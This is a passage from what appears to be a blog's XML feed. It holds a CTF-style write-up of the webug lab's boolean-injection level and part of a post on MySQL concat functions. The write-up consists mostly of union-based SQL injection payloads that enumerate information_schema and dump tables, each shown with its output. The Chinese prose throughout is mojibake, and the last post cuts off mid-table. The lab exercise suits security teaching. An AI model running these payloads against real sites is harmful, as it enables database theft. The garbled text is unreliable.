ï¼Œè¿™ä¸ªæŒ‡åç§»ä¸ºï¼š0 ä½ç½®ï¼Œå³å¼€å§‹ä½ç½®ï¼Œæœ€å¤š 8æ¡æ•°æ®ã€‚å’Œç¬¬ä¸€ç§å‚æ•°é¡ºåºç›¸åï¼Œä¸ç¬¬ä¸€ç§åŠŸèƒ½ç›¸åŒã€‚</p></li></ol><h1 id="æ€»ç»“å›é¡¾">æ€»ç»“å›é¡¾</h1><ol type="1"><li>ç›®å‰æ¥çœ‹ï¼ŒæŠ¥é”™æ³¨å…¥æœ€ä½³çš„è¯­å¥ä¾¿æ˜¯ XPATHçš„ä¸¤ä¸ªå‡½æ•°ï¼ˆé‰´äºç¬¬äºŒä¸ªå‡½æ•°å¤šä¸€ä¸ªå‚æ•°ï¼‰ï¼Œæœ€å¥½çš„è¯­å¥ä¾¿æ˜¯ XPATH çš„extractvalue è¯­å¥äº†ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webugä¹‹å¸ƒå°”æ³¨å…¥</title>
      <link href="/blog/2019/07/27/websec/sql_injection/boolean_based_of_webug/"/>
      <url>/blog/2019/07/27/websec/sql_injection/boolean_based_of_webug/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºäºå¸ƒå°”çš„ç›²æ³¨ç®€ä»‹"><strong>åŸºäºå¸ƒå°”çš„ç›²æ³¨ç®€ä»‹</strong></h1><p><strong>Web çš„é¡µé¢çš„ä»…ä»…ä¼šè¿”å› True å’Œ Falseä¸¤ç§çŠ¶æ€</strong>ï¼Œå¯¹å’±ä»¬æ¥è¯´ï¼Œä¹Ÿå°±æ˜¯æ­£å¸¸å’Œä¸æ­£å¸¸ã€‚å½“ç„¶ï¼Œè¿™ä¸ªä¸æ­£å¸¸çš„æ˜¯æ€ä¹ˆä¸æ­£å¸¸ï¼Œæ ·å­å°±å¤šäº†ã€‚æ¯”å¦‚ï¼šç½‘é¡µä¸­çš„æŸå¤„ç¼ºå°‘ä¸€å—å…ƒç´ ï¼ŒæŸäº›ä½ç½®ä¸èƒ½æ­£å¸¸æ˜¾ç¤ºç­‰ã€‚</p><p>é‚£ä¹ˆå¸ƒå°”ç›²æ³¨å°±æ˜¯è¿›è¡Œ SQL æ³¨å…¥ä¹‹åç„¶åæ ¹æ®é¡µé¢è¿”å›çš„ True æˆ–è€…æ˜¯ Falseï¼ˆä¹Ÿæ˜¯å°±æ˜¯é¡µé¢æ˜¯å¦æ˜¾ç¤ºæ­£å¸¸ï¼‰æ¥å¾—åˆ°æ•°æ®åº“ä¸­çš„ç›¸å…³ä¿¡æ¯ã€‚</p><p>å°±å…ˆä»‹ç»è¿™äº›åŸºç¡€çŸ¥è¯†ï¼Œä¾¿äºæˆ‘ä»¬æ³¨å…¥çš„æ—¶å€™åˆ¤æ–­æ˜¯ä¸æ˜¯å¸ƒå°”</p><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹">æ£€æµ‹æ³¨å…¥ç‚¹</h2><h3 id="å•å¼•å·æµ‹è¯•">å•å¼•å·æµ‹è¯•</h3><p>æµ‹è¯•åï¼Œæˆ‘ä»¬å‘ç°</p><blockquote><p>ç«™é•¿ä¸‹è½½()æ˜¯ä¸­å›½æœ€å¤§çš„ç«™é•¿ç±»èµ„æºä¸‹è½½ç½‘ç«™ï¼Œæä¾›æœ€æ–°æœ€å…¨çš„æºç å’Œç«™é•¿ç±»å·¥å…·ä¸‹è½½ï¼Œä¸“è®¾æºç æŠ¥å¯¼æ ç›®æä¾›æƒå¨çš„æºç è¯„æµ‹å’Œæ•™ç¨‹ï¼Œæ¨èå›½å†…å¤–ä¼˜ç§€æºç ã€‚</p></blockquote><p>ç›¸è¾ƒäº id = 1æ­£å¸¸æ˜¾ç¤ºé¡µé¢ï¼Œæˆ‘ä»¬åŠ å•å¼•å·ä¹‹åï¼Œè¿™ä¸€æ®µæ–‡å­—æ²¡æœ‰äº†ï¼Œå³ï¼šé¡µé¢æ˜¾ç¤ºä¸æ­£å¸¸äº†ã€‚</p><h3 id="æ³¨é‡Šæµ‹è¯•">æ³¨é‡Šæµ‹è¯•</h3><p>?id=1' --+ é¡µé¢æ˜¾ç¤ºæ­£å¸¸</p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬å¾—å‡ºä¸¤ç‚¹ï¼š</p><ol type="1"><li>æ²¡æœ‰æŠ¥é”™æç¤ºï¼Œåªæœ‰æ˜¾ç¤ºæ­£å¸¸ä¸ä¸æ­£å¸¸ã€‚åŸºäºæˆ‘ä»¬å¯¹å¸ƒå°”ç›²æ³¨çš„è®¤è¯†ï¼Œæˆ‘ä»¬è®¤ä¸ºè¿™å¯èƒ½æ˜¯å¸ƒå°”ç›²æ³¨ã€‚</li><li>è¿™é‡Œæˆ‘ä»¬çŒœæµ‹æ˜¯å­—ç¬¦å‹çš„ id = '1'</li></ol><p>å¦‚æœä¸ç¡®å®šçš„è¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è¿›è¡Œä¸€ä¸‹æµ‹è¯•</p><ol type="1"><li>ç”¨åŒå¼•å·æµ‹è¯•ï¼Œåˆå‘ç°æ­£å¸¸æ˜¾ç¤ºã€‚ï¼ˆæˆ‘ä»¬ä¹Ÿä¸å¿…ç€æ€¥å»çŒœæµ‹ sqlæŸ¥è¯¢è¯­å¥ï¼Œå› ä¸ºæ²¡æœ‰æŠ¥é”™ï¼Œæ²¡åŠæ³•çŒœã€‚ï¼‰</li><li>id = -1ï¼Œæ˜¾ç¤ºä¸æ­£å¸¸</li></ol><p>åœ¨æˆ‘ä»¬ä»ä¸ç¡®å®šæ˜¯å¦æ˜¯å¸ƒå°”ç›²æ³¨çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ¥ç€æŒ‰ç…§å›æ˜¾æ³¨å…¥çš„æµç¨‹è¿›è¡Œ</p><h2 id="order-by-çŒœå­—æ®µ">order by çŒœå­—æ®µ</h2><p>é¦–å…ˆåœ¨çŒœå­—æ®µçš„è¿‡ç¨‹ä¸­ï¼Œé¡µé¢æ²¡æœ‰ä»»ä½•æŠ¥é”™ï¼Œåªæœ‰æ­£å¸¸ä¸æ­£å¸¸æ˜¾ç¤ºã€‚order by2 æ—¶ï¼Œæ˜¾ç¤ºæ­£å¸¸ï¼Œorder by 3 æ—¶ï¼Œæ˜¾ç¤ºä¸æ­£å¸¸ã€‚æ•…å­—æ®µæ•°ä¸º 2</p><h2 id="ç¡®å®šæ˜¾ç¤ºä½">ç¡®å®šæ˜¾ç¤ºä½</h2><p>?id=1' union select 1,2 --+</p><p>æˆ‘ä»¬çªç„¶å‘ç°ç¬¬äºŒä¸ªå­—æ®µæ˜¯ä¸ªæ˜¾ç¤ºä½ï¼Œå°±ä¸Šé¢è¯´çš„æ—¶ä¸æ—¶æ¶ˆå¤±çš„é‚£æ®µè¯çš„å°¾éƒ¨ã€‚</p><p>å—¯ï¼Œæœ¬æ¥æƒ³è®²å¸ƒå°”ç›²æ³¨çš„ï¼Œçœ‹æ¥ webug çš„è¿™ä¸ªé¢˜è®¾ç½®çš„ä¹Ÿä¸å¥½ emmã€‚</p><p>å…¶å®å‰æœŸï¼Œé¡µé¢ä¸æŠ¥é”™ï¼Œåªæœ‰æ­£å¸¸ä¸ä¸æ­£å¸¸æ˜¾ç¤ºï¼Œæ˜¯å¸ƒå°”ç›²æ³¨çš„ä¸€å¤§ç‰¹å®šã€‚ä½†è¿™ä¹Ÿä¸ç»æ„äº¤ç»™æˆ‘ä»¬ä¸€ä¸ªé“ç†ï¼šä¸è¦å®Œå…¨ç›¸ä¿¡ç»éªŒï¼ˆé‚£äº›ç‰¹å¾ç­‰ï¼‰ï¼Œåªæœ‰æ ¹æ®å®é™…æƒ…å†µï¼Œæ‰èƒ½åšå‡ºæœ€ä½³çš„åˆ¤æ–­ï¼Œå›æ˜¾æ³¨å…¥å¯æ¯”å¸ƒå°”ç›²æ³¨è½»æ¾å¤šäº†ã€‚</p><h2 id="çˆ†ç‰ˆæœ¬ç­‰ä¿¡æ¯">çˆ†ç‰ˆæœ¬ç­‰ä¿¡æ¯</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,concat_ws(&#x27;</span>, <span class="string">&#x27;,version(),database(),user(),@@datadir,@@version_compile_os) --+</span></span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,concat_ws(&#x27;</span>, <span class="string">&#x27;,version(),database(),user(),@@datadir,@@version_compile_os) --+</span></span><br></pre></td></tr></table></figure><p>ä»è¿™é‡Œæˆ‘ä»¬çŸ¥é“ id = 1 æŸ¥è¯¢çš„å°±æ˜¯é‚£æ®µè¯ã€‚ å›æ˜¾ï¼š5.5.53, webug,root@localhost, C:, Win32</p><h2 id="çˆ†åº“å">çˆ†åº“å</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(schema_name) from information_schema.schemata --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼šinformation_schema,challenges,mysql,performance_schema,security,webug,webug_sys,webug_width_byte</p><h2 id="çˆ†-webug-åº“ä¸­çš„è¡¨">çˆ† webug åº“ä¸­çš„è¡¨</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>webug<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼šdata_crud,env_list,env_path,flag,sqlinjection,user,user_test</p><h2 id="çˆ†-flag-è¡¨çš„å­—æ®µå">çˆ† flag è¡¨çš„å­—æ®µå</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼šid,flag</p><p>è™½ç„¶ä¹‹å‰å›æ˜¾æ³¨å…¥é‚£ä¸€å…³, å°±æ˜¯ç”¨çš„è¿™ä¸ªåº“é‡Œé¢çš„ flag,æˆ‘è¿˜æ˜¯ä¹‰æ— åé¡¾åœ°çˆ†äº†è¿™ä¸ªè¡¨çš„å†…å®¹ emm(ä¸çŸ¥é“å½“æ—¶æ€ä¹ˆæƒ³çš„...)</p><h3 id="çˆ†è¡¨ä¸­çš„æ•°æ®">çˆ†è¡¨ä¸­çš„æ•°æ®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(concat_ws(&#x27;</span>, <span class="string">&#x27;,id,flag) SEPARATOR &#x27;</span>;<span class="string">&#x27;) from flag --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼š1, dfafdasfafdsadfa</p><p>æäº¤ flag æœç„¶ä¸å¯¹.</p><h2 id="çˆ†-sqlinjection-è¡¨çš„å­—æ®µå">çˆ† sqlinjection è¡¨çš„å­—æ®µå</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>sqlinjection<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼šid,content,id,content å¥‡æ€ªï¼Œåˆ—åè¿˜èƒ½é‡å¤ï¼Ÿï¼Ÿï¼Ÿç»è¿‡æŸ¥è¯, webugé‡Œé¢æœ‰ä¸¤ä¸ª sqlinjection è¡¨ï¼Œå¦ä¸€ä¸ªè¡¨åœ¨ webug_width_byte åº“ä¸­ï¼Œè¯¥è¡¨ä¹Ÿæœ‰idï¼Œcontent ä¸¤ä¸ªå­—æ®µï¼Œ<strong>ç»éªŒæ•™è®­ï¼šçˆ†å­—æ®µåæ—¶ï¼Œå°†åº“åå’Œè¡¨åéƒ½è¦æŒ‡å®šï¼Œé¿å…å‡ºç°ä¸åŒåº“å‡ºç°ç›¸åŒè¡¨çš„åŸå› ã€‚</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>webug<span class="string">&#x27; and table_name=&#x27;</span>sqlinjection<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><h3 id="çˆ†è¡¨ä¸­çš„æ•°æ®-1">çˆ†è¡¨ä¸­çš„æ•°æ®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(concat_ws(&#x27;</span>, <span class="string">&#x27;,id,content) separator &#x27;</span>; <span class="string">&#x27;) from sqlinjection --+</span></span><br></pre></td></tr></table></figure><p>å†…å®¹: 1, ç«™é•¿ä¸‹è½½....ä¼˜ç§€æºç ã€‚; 2, hello</p><p>åˆæ²¡æœ‰ flag</p><h2 id="çˆ†-data_crud-è¡¨çš„å­—æ®µå">çˆ† data_crud è¡¨çš„å­—æ®µå</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>data_crud<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾: id,name,age,email,gender</p><p>çœ‹ç€ä¸åƒ flag</p><h2 id="æ¢è¡¨-env_list">æ¢è¡¨: env_list</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>env_list<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾:id,envName,envDesc,envIntegration,delFlag,envFlag,level,type</p><h3 id="çˆ†-delflag-å’Œ-envflag-å­—æ®µå†…å®¹">çˆ† delFlag å’Œ envFlagå­—æ®µå†…å®¹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(concat_ws(&#x27;</span>, <span class="string">&#x27;,delFlag,envFlag) separator &#x27;</span>; <span class="string">&#x27;) from env_list --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾äº†ä¸€å †å‘€: 0, dfafdasfafdsadfa; 0, fdsafsdfa; 0, gfdgdfsdg; 0,dsfasdczxcg; 0, safsafasdfasdf; 0, dfsadfsadfas; 0, ddfasdfsafsadfsd; 0,; 0, fsdafasdfas; 0, asdfsdfadfsdrew; 0, htryyujryfhyjtrjn; 0,uoijkhhnloh; 0, poipjklkjppoi; 0; 0, sadfvgsadfhe; 0, poiplmkounipoj; 0,sadfsadfsdadf; 0, sdfasdfgfddst; 0, vnghuytiuygui; 0, sadfhbvjyyiyukuyt;0, vbchjgwestruyi; 0; 0; 0; 0; 0; 0; 0; 0; 0</p><p>çœ‹æ¥ delFlag å¥½å¤šæ˜¯ 0, è¿˜æ˜¯ä¸çœ‹å®ƒäº†.</p><p>ç®€åŒ–ä¸€ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(envFlag separator &#x27;</span>; <span class="string">&#x27;) from env_list group by delFlag --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾:</p><p>dfafdasfafdsadfa; sadfsadfsdadf; sdfasdfgfddst; vnghuytiuygui;sadfhbvjyyiyukuyt; vbchjgwestruyi; poiplmkounipoj; sadfvgsadfhe;fdsafsdfa; gfdgdfsdg; dsfasdczxcg; safsafasdfasdf; dfsadfsadfas;ddfasdfsafsadfsd; ; fsdafasdfas; asdfsdfadfsdrew; htryyujryfhyjtrjn;uoijkhhnloh; poipjklkjppoi</p><p>è¿™ä¹ˆä¸€å † flag éš¾é“æ˜¯ webug æ‰€æœ‰çš„ flag? ç¬é—´å¼€å¿ƒ,ä¸€ä¸ªä¸ªè¯•,è¯•å‡ºfdsafsdfa ä¸ºå¸ƒå°”æ³¨å…¥è¿™ä¸€å…³çš„ flag.</p><p>è‡³æ­¤, ä¸å°å¿ƒå‘ç°çš„ä½¿ç”¨å›æ˜¾æ³¨å…¥çš„å¸ƒå°”æ³¨å…¥é¢˜ç›®å®Œç»“.</p><p>å¸ƒå°”æ³¨å…¥æˆ‘è¿˜æ˜¯å†æ‰¾ä¸€ä¸ªåˆ«çš„æ³¨å…¥ç‚¹å†™å§.</p><h1 id="æ€»ç»“å›é¡¾">æ€»ç»“å›é¡¾</h1><ol type="1"><li>åœ¨è¿›è¡Œæ³¨å…¥ç‚¹æµ‹è¯•ä¹‹å‰ï¼Œå…ˆå¤§è‡´çœ‹ä¸€ä¸‹é¡µé¢ï¼Œè¿™æ ·å¦‚æœæ˜¯å¸ƒå°”ç›²æ³¨ï¼Œå¯ä»¥åœ¨æµ‹è¯•æ—¶ï¼Œå¿«é€Ÿå‘ç°,å½“ç„¶,å¦‚æœå‰æœŸæœ‰äº›ç‰¹å¾,ä¸è¦ç€æ€¥ç”¨å¸ƒå°”ç›²æ³¨,å¯ä»¥å…ˆè¯•è¯•å›æ˜¾æ³¨å…¥ã€‚</li><li><strong>çˆ†å­—æ®µåæ—¶ï¼Œå°†åº“åå’Œè¡¨åéƒ½è¦æŒ‡å®šï¼Œé¿å…å‡ºç°ä¸åŒåº“å‡ºç°ç›¸åŒè¡¨çš„åŸå› ã€‚</strong></li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysqlä¸­concatç›¸å…³å‡½æ•°è¯¦è§£</title>
      <link href="/blog/2019/07/25/websec/sql_injection/about_concat_func_of_mysql/"/>
      <url>/blog/2019/07/25/websec/sql_injection/about_concat_func_of_mysql/</url>
      
        <content type="html"><![CDATA[<h2 id="concat">concat</h2><ol type="1"><li><p>å•çº¯è¿æ¥å­—ç¬¦ä¸²</p><p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="string">&#x27;MySQL &#x27;</span> <span class="string">&#x27;String &#x27;</span> <span class="string">&#x27;Concatenation&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="operator">|</span> MySQL                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="operator">|</span> MySQL String Concatenation <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> concat(<span class="string">&#x27;MySQL &#x27;</span> <span class="string">&#x27;String &#x27;</span> <span class="string">&#x27;Concatenation&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat(<span class="string">&#x27;MySQL &#x27;</span> <span class="string">&#x27;String &#x27;</span> <span class="string">&#x27;Concatenation&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> MySQL String Concatenation                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------+</span></span><br></pre></td></tr></table></figure></p></li><li><p>select æŸ¥è¯¢æ—¶ï¼Œè¿æ¥å­—æ®µçš„å€¼ã€‚</p><p>å½“ç„¶ï¼Œå¦‚æœä½ åœ¨å­—æ®µä¸­é—´å†è¿æ¥ä¸Šç©ºæ ¼æˆ–é€—å·ï¼Œä¹Ÿå°±ç›¸å½“äºåŠ äº†åˆ†éš”ç¬¦ã€‚</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(username, &#x27;,&#x27;,&#x27;passwd&#x27;) from tuser;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| concat(username, &#x27;,&#x27;,&#x27;passwd&#x27;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| admin,passwd                   |</span><br><span class="line">| adam,passwd                    |</span><br><span class="line">| bob,passwd                     |</span><br><span class="line">| colin,passwd                   |</span><br><span class="line">| doc,passwd                     |</span><br><span class="line">| doctor,passwd                  |</span><br><span class="line">| elite,passwd                   |</span><br><span class="line">| admin,passwd                   |</span><br><span class="line">| adam,passwd                    |</span><br><span class="line">| bob,passwd                     |</span><br><span class="line">| colin,passwd                   |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure></p><p>concat å’Œ concat_wså¯ä»¥å‘æŒ¥å·®ä¸å¤šçš„åŠŸèƒ½ï¼Œåªæ˜¯è¦è¿æ¥çš„å­—æ®µæ¯”è¾ƒå¤šæ—¶ï¼Œä½¿ç”¨ concatä½ å°±è¦æ‰‹å†™å¤šä¸ªåˆ†éš”ç¬¦ï¼Œä½¿ç”¨ concat_ws å†™ä¸€ä¸ªå°±è¡Œäº†ã€‚</p><p>æ³¨ï¼šä½ ç°åœ¨æŸ¥è¯¢çœ‹ç€æ¯ä¸€æ¡è®°å½•éƒ½æ˜¯æœ‰æ¢è¡Œçš„ï¼Œä½†æ˜¯ sqlæ³¨å…¥çš„æ—¶å€™ï¼Œå°±æ²¡æœ‰äº†ï¼Œé‚£æ ·ä¸Šä¸€è¡Œåé¢ä¸è¿™ä¸€è¡Œçš„å‰é¢å°±æ¥ä¸Šäº†ï¼Œè¿™æ ·æ¥çœ‹ï¼Œgroup_concatè¿™ä¸ªä¸ä»…å¯ä»¥åˆ†ç»„è¿æ¥å­—ç¬¦ä¸²ï¼Œè¿˜å¯ä»¥ç”¨æ¥åˆ†éš”æ¯æ¡è®°å½•æ•°æ®çš„å‡½æ•°å˜å¾ˆå¥½äº†ã€‚ä¸‰ç§å‡½æ•°å…·ä½“ä½¿ç”¨è‡ªå·±ä½“ä¼šå§ã€‚</p></li></ol><h2 id="concat_ws">concat_ws</h2><p>concat with separator å¸¦æœ‰åˆ†éš”ç¬¦çš„å­—ç¬¦ä¸²è¿æ¥ã€‚</p><p>CONCAT<em>WS(_separator</em>, <em>expression1</em>,<em>expression2</em>, *...)</p><h2 id="group_concat-å‡½æ•°">group_concat å‡½æ•°</h2><p>è¿™é‡Œå°†è®²è§£å¦‚ä½•ä½¿ç”¨å‡ ç§é€‰é¡¹æ¥è¿æ¥ä¸€ä¸ªç»„ä¸­çš„å­—ç¬¦ä¸²ã€‚ï¼ˆæ²¡äº‹ï¼Œç›¸ä¿¡ä½ ä¹Ÿä¸æ‡‚è¿™å¥è¯ï¼Œé‚£å°±å¯¹äº†ï¼Œè¦ä¸çœ‹è¿™ç¯‡æ–‡ç« å¹²ä»€ä¹ˆã€‚ï¼‰</p><h3 id="ç®€ä»‹">ç®€ä»‹</h3><p>The MySQL <code>GROUP_CONCAT</code> function concatenates stringsfrom a group into a single string with various options.</p><p>mysql ä¸­çš„ group_concatå‡½æ•°é€šè¿‡ä½¿ç”¨ä¸€äº›é€‰é¡¹å°†ä¸€ä¸ªç»„ä¸­çš„æ•°æ®è¿æ¥æˆä¸€ä¸ªé»˜è®¤ä»¥é€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ã€‚</p><p>èµ·åˆï¼Œæ„Ÿè§‰è¿™ä¸ªç»„æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œå¥½æŠ½è±¡ï¼Œéš¾é“ group_concat åªèƒ½å’Œ groupby ä¸€èµ·ä½¿ç”¨å—ï¼Ÿç›´åˆ°å†™è¿™ç¯‡æ–‡ç« æŸ¥èµ„æ–™æ‰æ¸…æ¥šã€‚</p><p>å½“ä½ ä½¿ç”¨ group by æ—¶ï¼Œ è¿™ä¸ªç»„çš„æ¦‚å¿µï¼Œå½“ç„¶å°±æ˜¯ï¼ŒæŒ‰ç…§ä½  group byå­—æ®µåˆ†çš„ç»„äº†ã€‚å½“ä½ æœªä½¿ç”¨ group by æ—¶ï¼Œ ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨ group_concatçš„ï¼Œè€Œæ­¤æ—¶ï¼Œè¿™ä¸ªç»„ä¾¿æ˜¯æ‰€æœ‰çš„è®°å½•ï¼Œå®ƒå°±ç›´æ¥å°†æ‰€æœ‰è®°å½•ä¸­çš„è¿™ä¸ªå­—æ®µï¼Œç”¨æŒ‡å®šçš„åˆ†å‰²ç¬¦ï¼Œè¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>åœ¨ mysql æ§åˆ¶å°è¾“å…¥å‘½ä»¤ï¼šhelp group_concat;</p><blockquote><p>The full syntax is as follows:</p><p>GROUP_CONCAT([DISTINCT] expr [,expr ...]ORDER BY {unsigned_integer |col_name | expr} [ASC | DESC][,col_name ...]] [SEPARATOR str_val])</p></blockquote><p>æ³¨ï¼š[] æ–¹æ‹¬å·æ˜¯å¯é€‰çš„ï¼Œå¯å†™å¯ä¸å†™ï¼Œï½›ï½å¤§æ‹¬å·æ˜¯è¦å†™çš„ï¼Œ[]ä¸­æœ‰ï½›ï½çš„è¯ï¼Œé‚£å°±æ˜¯å¦‚æœä½ è¦ä½¿ç”¨ []ä¸­çš„é‚£ä¸ªé€‰é¡¹ï¼Œï½›ï½ä¸­çš„å†…å®¹å¿…é¡»å†™ã€‚</p><p>å¯ä»¥çœ‹å‡ºï¼Œä¸‰ä¸ªå­å¥åªæœ‰ç¬¬ä¸€ä¸ªå­å¥æ˜¯å†™çš„ï¼Œä¹Ÿå°±æ˜¯è‡³å°‘æŒ‡å®šä½ è¦è¿›è¡Œç»„å­—ç¬¦ä¸²è¿æ¥çš„å­—æ®µåã€‚</p><p>ç®€å•ç‰ˆï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GROUP_CONCAT(<span class="keyword">DISTINCT</span> expression</span><br><span class="line">    <span class="keyword">ORDER</span> <span class="keyword">BY</span> expression</span><br><span class="line">    SEPARATOR sep);</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šgroup_concatä¸­çš„ä¸‰ä¸ªå­å¥/é€‰é¡¹ä¸­é—´ä½¿ç”¨çš„æ˜¯ç©ºæ ¼åˆ†éš”ç¬¦ï¼Œä¸è¦åŠ é€—å·ä»€ä¹ˆçš„ã€‚</p><p>å…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬å‡†å¤‡ç”¨æ¥åšä¾‹å­çš„è¡¨çš„æ•°æ®ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> passwd   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> basswd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span> vassword <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span> gasswd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> colin    <span class="operator">|</span> passwd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> doc      <span class="operator">|</span> passwd   <span 